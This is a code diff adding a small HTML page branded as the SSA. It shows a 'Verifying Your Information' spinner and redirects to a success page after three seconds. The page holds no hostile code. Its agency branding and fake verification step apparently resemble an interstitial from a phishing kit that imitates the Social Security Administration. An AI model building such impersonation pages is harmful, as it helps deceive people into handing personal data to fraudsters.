@@ -1,0 +1,78 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <!-- Favicon -->
+  <link rel="icon" href="ssa.png" type="image/x-icon">
+  <link rel="icon" type="image/png" sizes="32x32" href="ssa.png">
+  <link rel="apple-touch-icon" sizes="180x180" href="ssa.png">
+  <title>Processing information | SSA</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --color-primary: #005ea2;
+      --color-gray: #71767a;
+      --color-gray-light: #f0f0f0;
+      --color-white: #ffffff;
+      --radius: 8px;
+      font-family: Inter, system-ui, sans-serif;
+    }
+    body {
+      margin: 0;
+      background: var(--color-gray-light);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      color: #111;
+    }
+    .box {
+      background: var(--color-white);
+      padding: 32px;
+      max-width: 500px;
+      width: 90%;
+      border-radius: var(--radius);
+      box-shadow: 0 6px 24px rgba(0, 0, 0, 0.05);
+      text-align: center;
+    }
+    .spinner {
+      margin: 0 auto 24px;
+      width: 48px;
+      height: 48px;
+      border: 6px solid #dcdcdc;
+      border-top-color: var(--color-primary);
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+    h1 {
+      margin: 0 0 12px;
+      font-size: 1.4rem;
+      font-weight: 600;
+    }
+    p {
+      margin: 0;
+      color: var(--color-gray);
+      font-size: 1rem;
+      line-height: 1.4;
+    }
+  </style>
+</head>
+<body>
+  <div class="box">
+    <div class="spinner"></div>
+    <h1>Verifying Your Information</h1>
+    <p>Please wait — we’re confirming your information. This may take a moment.</p>
+  </div>
+  
+  <script>
+    // Redirect after 3 seconds
+    setTimeout(function() {
+      window.location.href = "successful-page.html"; // Replace with your next page
+    }, 3000); // 3000ms = 3 seconds
+  </script>
+</body>
+</html>
